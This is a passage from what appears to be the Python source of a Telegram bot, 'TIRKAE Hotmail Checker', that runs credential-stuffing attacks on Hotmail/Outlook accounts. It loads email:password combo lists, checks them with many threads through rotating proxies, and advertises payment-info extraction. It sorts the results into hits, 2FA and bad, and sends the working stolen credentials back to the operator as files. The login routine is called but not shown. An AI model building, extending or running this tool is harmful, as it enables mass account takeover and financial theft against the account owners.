    secs = int(elapsed % 60)
    sr = s.get_success_rate()
    text = (
        f"🩸 𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 𝗙𝗜𝗡𝗔𝗟 𝗦𝗨𝗠𝗠𝗔𝗥𝗬\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 📦 𝗧𝗼𝘁𝗮𝗹     │ <code>{s.total}</code>\n"
        f"│ ✅ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱   │ <code>{s.checked}</code>\n"
        f"│ 🔥 𝗛𝗶𝘁𝘀      │ <code>{s.hits}</code>\n"
        f"│ ❌ 𝗕𝗮𝗱       │ <code>{s.bad}</code>\n"
        f"│ 🔐 𝟮𝗙𝗔       │ <code>{s.twofa}</code>\n"
        f"│ ❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻   │ <code>{s.unknown}</code>\n"
        f"│ 🔄 𝗥𝗲𝘁𝗿𝗶𝗲𝘀   │ <code>{s.retries}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ 📈 𝗦𝘂𝗰𝗰𝗲𝘀𝘀   │ <code>{sr}%</code>\n"
        f"│ ⏱ 𝗧𝗶𝗺𝗲      │ <code>{mins}m {secs}s</code>\n"
        f"│ ⚡ 𝗔𝘃𝗴 𝗖𝗣𝗠   │ <code>{s.get_cpm()}</code>\n"
        f"└──────────────────────────┘\n"
    )
    return text

def send_result_files(s):
    session_dir = f"results_{s.chat_id}_{s.message_id}"
    os.makedirs(session_dir, exist_ok=True)
    files = []

    if s.hit_lines:
        path = os.path.join(session_dir, "Hits.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.hit_lines))
        files.append(path)

    if s.bad_lines:
        path = os.path.join(session_dir, "Bad.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.bad_lines))
        files.append(path)

    if s.twofa_lines:
        path = os.path.join(session_dir, "2FA.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.twofa_lines))
        files.append(path)

    if s.unknown_lines:
        path = os.path.join(session_dir, "Unknown.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.unknown_lines))
        files.append(path)

    summary_path = os.path.join(session_dir, "Summary.txt")
    elapsed = time.time() - s.start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    with open(summary_path, 'w', encoding='utf-8') as f:
        f.write("TIRKAE HOTMAIL CHECKER - SUMMARY\n")
        f.write("================================\n\n")
        f.write(f"Total: {s.total}\n")
        f.write(f"Checked: {s.checked}\n")
        f.write(f"Hits: {s.hits}\n")
        f.write(f"Bad: {s.bad}\n")
        f.write(f"2FA: {s.twofa}\n")
        f.write(f"Unknown: {s.unknown}\n")
        f.write(f"Retries: {s.retries}\n")
        f.write(f"Success Rate: {s.get_success_rate()}%\n")
        f.write(f"Time: {mins}m {secs}s\n")
        f.write(f"Avg CPM: {s.get_cpm()}\n")
    files.append(summary_path)

    for fp in files:
        try:
            with open(fp, 'rb') as f:
                bot.send_document(s.chat_id, f, reply_to_message_id=s.message_id)
        except Exception as e:
            print(f"[ERROR] Sending file {fp}: {e}")

    try:
        shutil.rmtree(session_dir, ignore_errors=True)
    except:
        pass

def update_status_message(s, finished=False):
    now = time.time()
    if not finished and (now - s.last_update_time) < 3:
        return
    s.last_update_time = now
    text = build_status_text(s, finished=finished)
    if finished:
        try:
            bot.edit_message_text(text, s.chat_id, s.message_id, parse_mode="HTML")
        except:
            pass
    else:
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{s.chat_id}_{s.message_id}"),
            InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{s.chat_id}_{s.message_id}")
        )
        try:
            bot.edit_message_text(text, s.chat_id, s.message_id, parse_mode="HTML", reply_markup=kb)
        except:
            pass

def checker_worker(s):
    while not s.stop_flag.is_set():
        try:
            combo = s.combo_queue.get_nowait()
        except queue.Empty:
            break

        email_display = combo.split(':')[0] if ':' in combo else combo
        with s.lock:
            s.current_checking = email_display

        proxy_dict = s.get_proxy_dict()

        try:
            final_status, hit_data_str, retries = anasChkAccount(combo, proxy_dict)
        except Exception as e:
            final_status = "EXCEPTION"
            hit_data_str = None
            retries = 0
            print(f"[EXCEPTION] {combo}: {e}")

        # If proxy error, remove proxy from pool (only for auto proxies)
        if final_status == "PROXY_ERROR" and s.use_default_proxies and proxy_dict:
            s.report_proxy_failure(proxy_dict)

        with s.lock:
            s.checked += 1
            s.retries += retries
            if final_status == "HIT":
                s.hits += 1
                if hit_data_str:
                    s.hit_lines.append(hit_data_str)
                    print(f"[HIT] {hit_data_str}")
                else:
                    s.hit_lines.append(combo)
                    print(f"[HIT] {combo}")
            elif final_status == "BAD_CREDENTIALS":
                s.bad += 1
                s.bad_lines.append(combo)
                print(f"[BAD] {combo}")
            elif final_status == "2FA_REQUIRED":
                s.twofa += 1
                s.twofa_lines.append(combo)
                print(f"[2FA] {combo}")
            else:
                s.unknown += 1
                s.unknown_lines.append(f"{combo} | {final_status}")
                print(f"[{final_status}] {combo}")

        update_status_message(s)
        s.combo_queue.task_done()

def run_checker(s):
    print(f"[INFO] Starting checker: {s.total} combos, {s.threads_count} threads")
    threads = []
    actual_workers = min(s.threads_count, s.total)
    if actual_workers == 0:
        actual_workers = 1

    for _ in range(actual_workers):
        t = threading.Thread(target=checker_worker, args=(s,), daemon=True)
        threads.append(t)
        t.start()

    while True:
        alive = any(t.is_alive() for t in threads)
        if not alive:
            break
        if s.stop_flag.is_set():
            while not s.combo_queue.empty():
                try:
                    s.combo_queue.get_nowait()
                    s.combo_queue.task_done()
                except queue.Empty:
                    break
            break
        time.sleep(1)
        update_status_message(s)

    for t in threads:
        t.join(timeout=5)

    stopped = s.stop_flag.is_set()
    update_status_message(s, finished=True)

    summary_text = build_summary_text(s)
    if stopped:
        summary_text = f"🛑 <b>CHECKER STOPPED</b>\n\n" + summary_text
    else:
        summary_text = f"✅ <b>CHECKER COMPLETED</b>\n\n" + summary_text

    try:
        bot.send_message(s.chat_id, summary_text, parse_mode="HTML", reply_to_message_id=s.message_id)
    except Exception as e:
        print(f"[ERROR] Sending summary: {e}")

    send_result_files(s)

    session_key = f"{s.chat_id}_{s.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]

    print(f"[INFO] Checker done. H:{s.hits} B:{s.bad} 2FA:{s.twofa} U:{s.unknown}")

# ---------- BOT COMMANDS ----------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ <b>Access Denied</b>", parse_mode="HTML")
        return

    text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗛𝗢𝗧𝗠𝗔𝗜𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Welcome to Tirkae Checker</b>\n\n"
        f"🦋 <i>Premium Hotmail/Outlook Account Checker</i>\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 💀 <b>𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦</b>                   │\n"
        f"├──────────────────────────┤\n"
        f"│ ✅ Full Account Validation   │\n"
        f"│ 💳 Payment Info Extraction   │\n"
        f"│ 🏆 Rewards Points Check      │\n"
        f"│ 🔐 2FA Detection             │\n"
        f"│ ⚡ Multi-Threaded Engine     │\n"
        f"│ 📊 Live Progress Updates     │\n"
        f"│ 🔍 Auto Format Detection     │\n"
        f"│ 🌐 Auto Proxy Scraper        │\n"
        f"└──────────────────────────┘\n\n"
        f"📁 <b>Send me a combo file to start</b>\n"
        f"<i>Supported: .txt files with email:pass</i>\n"
        f"<i>Any format supported - auto extraction</i>\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ <b>Access Denied</b>", parse_mode="HTML")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error reading file:</b> <code>{e}</code>", parse_mode="HTML")
        return

    combos = extract_combos(content)

    if not combos:
        bot.reply_to(
            message,
            "❌ <b>No valid combos found!</b>\n\n<i>Make sure file contains email:password format</i>",
            parse_mode="HTML"
        )
        return

    user_states[message.from_user.id] = {
        'combos': combos,
        'original_message_id': message.message_id
    }

    text = (
        f"🩸 <b>𝗖𝗢𝗠𝗕𝗢𝗦 𝗟𝗢𝗔𝗗𝗘𝗗</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 <b>Total Combos:</b> <code>{len(combos)}</code>\n\n"
        f"⚡ <b>Now send the number of threads</b>\n"
        f"<i>Choose between 1 to 100</i>\n\n"
        f"<b>Example:</b> <code>10</code>\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.from_user.id in user_states and m.text and m.text.strip().isdigit())
def handle_threads(message):
    if message.from_user.id not in user_states:
        return

    threads_count = int(message.text.strip())
    if threads_count < 1 or threads_count > 100:
        bot.reply_to(
            message,
            "⚠️ <b>Invalid thread count!</b>\n<i>Send a number between 1 and 100</i>",
            parse_mode="HTML"
        )
        return

    # Store threads and ask for proxy option
    user_states[message.from_user.id]['threads'] = threads_count
    user_states[message.from_user.id]['step'] = 'awaiting_proxy'

    bot.send_message(
        message.chat.id,
        "📁 <b>Proxy Option</b>\n\n"
        "Send a proxy file (ip:port or protocol://user:pass@ip:port) OR\n"
        "Type <code>default</code> to use auto-scraped proxies (refreshed every 5 minutes)\n"
        "Type <code>skip</code> to run without proxies",
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.lower() == 'default')
def handle_default_proxy(message):
    if message.from_user.id not in user_states or user_states[message.from_user.id].get('step') != 'awaiting_proxy':
        bot.reply_to(message, "⚠️ Please send a combo file and threads first.")
        return

    state = user_states.pop(message.from_user.id)
    combos = state['combos']
    threads = state['threads']

    starting_text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Initializing engine...</b>\n"
        f"📦 <b>Combos:</b> <code>{len(combos)}</code>\n"
        f"🔥 <b>Threads:</b> <code>{threads}</code>\n"
        f"🌐 <b>Proxies:</b> <code>Auto-scraped (refreshing)</code>\n\n"
        f"🔄 <i>Please wait...</i>\n"
    )
    sent = bot.reply_to(message, starting_text, parse_mode="HTML")
    status_msg_id = sent.message_id

    s = CheckerSession(message.chat.id, status_msg_id, combos, threads, use_default_proxies=True)
    session_key = f"{message.chat.id}_{status_msg_id}"
    active_sessions[session_key] = s

    # Trigger initial proxy refresh if needed
    if not proxy_manager.proxies:
        threading.Thread(target=proxy_manager.refresh, daemon=True).start()

    initial_text = build_status_text(s)
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{message.chat.id}_{status_msg_id}"),
        InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{message.chat.id}_{status_msg_id}")
    )
    try:
        bot.edit_message_text(initial_text, message.chat.id, status_msg_id, parse_mode="HTML", reply_markup=kb)
    except:
        pass

    t = threading.Thread(target=run_checker, args=(s,), daemon=True)
    t.start()

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.lower() == 'skip')
def handle_skip_proxy(message):
    if message.from_user.id not in user_states or user_states[message.from_user.id].get('step') != 'awaiting_proxy':
        bot.reply_to(message, "⚠️ Please send a combo file and threads first.")
        return

    state = user_states.pop(message.from_user.id)
    combos = state['combos']
    threads = state['threads']

    starting_text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Initializing engine...</b>\n"
        f"📦 <b>Combos:</b> <code>{len(combos)}</code>\n"
        f"🔥 <b>Threads:</b> <code>{threads}</code>\n"
        f"🌐 <b>Proxies:</b> <code>None</code>\n\n"
        f"🔄 <i>Please wait...</i>\n"
    )
    sent = bot.reply_to(message, starting_text, parse_mode="HTML")
    status_msg_id = sent.message_id

    s = CheckerSession(message.chat.id, status_msg_id, combos, threads, use_default_proxies=False)
    session_key = f"{message.chat.id}_{status_msg_id}"
    active_sessions[session_key] = s

    initial_text = build_status_text(s)
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{message.chat.id}_{status_msg_id}"),
        InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{message.chat.id}_{status_msg_id}")
    )
    try:
        bot.edit_message_text(initial_text, message.chat.id, status_msg_id, parse_mode="HTML", reply_markup=kb)
    except:
        pass

    t = threading.Thread(target=run_checker, args=(s,), daemon=True)
    t.start()

@bot.message_handler(content_types=['document'], func=lambda m: m.from_user.id == ADMIN_ID and m.from_user.id in user_states and user_states[m.from_user.id].get('step') == 'awaiting_proxy')
def handle_proxy_file(message):
    if message.from_user.id not in user_states:
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
        proxies = load_proxies_from_text(content)
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error reading proxy file:</b> <code>{e}</code>", parse_mode="HTML")
        return

    if not proxies:
        bot.reply_to(message, "❌ <b>No valid proxies found!</b>\nType <code>default</code> or <code>skip</code>.", parse_mode="HTML")
        return

    state = user_states.pop(message.from_user.id)
    combos = state['combos']
    threads = state['threads']

    starting_text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Initializing engine...</b>\n"
        f"📦 <b>Combos:</b> <code>{len(combos)}</code>\n"
        f"🔥 <b>Threads:</b> <code>{threads}</code>\n"
        f"🌐 <b>Proxies:</b> <code>Custom ({len(proxies)})</code>\n\n"
        f"🔄 <i>Please wait...</i>\n"
    )
    sent = bot.reply_to(message, starting_text, parse_mode="HTML")
    status_msg_id = sent.message_id

    s = CheckerSession(message.chat.id, status_msg_id, combos, threads, use_default_proxies=False, custom_proxies=proxies)
    session_key = f"{message.chat.id}_{status_msg_id}"
    active_sessions[session_key] = s

    initial_text = build_status_text(s)
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{message.chat.id}_{status_msg_id}"),
        InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{message.chat.id}_{status_msg_id}")
    )
    try:
        bot.edit_message_text(initial_text, message.chat.id, status_msg_id, parse_mode="HTML", reply_markup=kb)
    except:
        pass

    t = threading.Thread(target=run_checker, args=(s,), daemon=True)
    t.start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Access Denied", show_alert=True)
        return
    parts = call.data.split("_")
    if len(parts) >= 3:
        session_key = f"{parts[1]}_{parts[2]}"
        if session_key in active_sessions:
            active_sessions[session_key].stop_flag.set()
            bot.answer_callback_query(call.id, "🛑 Stopping checker...", show_alert=False)
        else:
            bot.answer_callback_query(call.id, "⚠️ Session not found or already finished", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⚠️ Invalid action", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gethits_"))
def handle_gethits(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Access Denied", show_alert=True)
        return
    parts = call.data.split("_")
    if len(parts) >= 3:
        session_key = f"{parts[1]}_{parts[2]}"
        if session_key in active_sessions:
            s = active_sessions[session_key]
            bot.answer_callback_query(call.id, "📥 Sending current results...", show_alert=False)
            with s.lock:
                current_hits = list(s.hit_lines)
                current_twofa = list(s.twofa_lines)
                current_unknown = list(s.unknown_lines)
                current_bad = s.bad
                current_checked = s.checked

            temp_dir = f"temp_{session_key}"
            os.makedirs(temp_dir, exist_ok=True)
            files_sent = False

            if current_hits:
                path = os.path.join(temp_dir, "Hits_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_hits))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            if current_twofa:
                path = os.path.join(temp_dir, "2FA_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_twofa))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            if current_unknown:
                path = os.path.join(temp_dir, "Unknown_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_unknown))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            interim_text = (
                f"📊 <b>𝗜𝗡𝗧𝗘𝗥𝗜𝗠 𝗥𝗘𝗣𝗢𝗥𝗧</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Hits: <code>{len(current_hits)}</code>\n"
                f"❌ Bad: <code>{current_bad}</code>\n"
                f"🔐 2FA: <code>{len(current_twofa)}</code>\n"
                f"❓ Unknown: <code>{len(current_unknown)}</code>\n"
                f"📦 Checked: <code>{current_checked}/{s.total}</code>\n"
            )
            try:
                bot.send_message(call.message.chat.id, interim_text, parse_mode="HTML", reply_to_message_id=int(parts[2]))
            except:
                pass

            if not files_sent:
                try:
                    bot.send_message(call.message.chat.id, "📭 <i>No hits, 2FA, or unknown results yet</i>", parse_mode="HTML", reply_to_message_id=int(parts[2]))
                except:
                    pass

            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "⚠️ Session not found", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⚠️ Invalid action", show_alert=True)

@bot.message_handler(func=lambda m: m.from_user.id != ADMIN_ID)
def handle_unauthorized(message):
    bot.reply_to(message, "⛔ <b>Access Denied</b>\n<i>You are not authorized.</i>", parse_mode="HTML")

if __name__ == "__main__":
    print("🩸 TIRKAE Hotmail Checker Bot Starting...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("⚡ Bot is running...")
    # Start initial proxy refresh
    threading.Thread(target=proxy_manager.refresh, daemon=True).start()
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
